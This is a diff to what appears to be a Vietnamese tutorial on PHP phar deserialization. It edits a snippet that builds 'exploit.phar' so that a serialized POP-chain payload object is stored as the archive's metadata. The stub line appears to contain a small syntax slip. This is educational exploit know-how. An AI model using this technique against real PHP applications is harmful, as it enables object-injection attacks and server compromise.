@@ -125,13 +125,16 @@ Ta có thể tóm lại cách khai thác qua 3 bước:
 
 Code ví dụ tạo một phar file:
 ```php
+
+    $serial = serialize($payload_object); // serialize POP chain object
+
     $phar = new Phar("exploit.phar");
     
     $phar->startBuffering();
     
     $phar->setStub("<?php __HALT_COMPILER(); >");                                                                                      
     
-    $phar->setMetadata($a); //Save custom meta-data into manifest 
+    $phar->setMetadata($serial); //Save custom meta-data into manifest 
     $phar->addFromString("test.txt", "test"); //Add files to be compressed 
 
     $phar->stopBuffering(); 
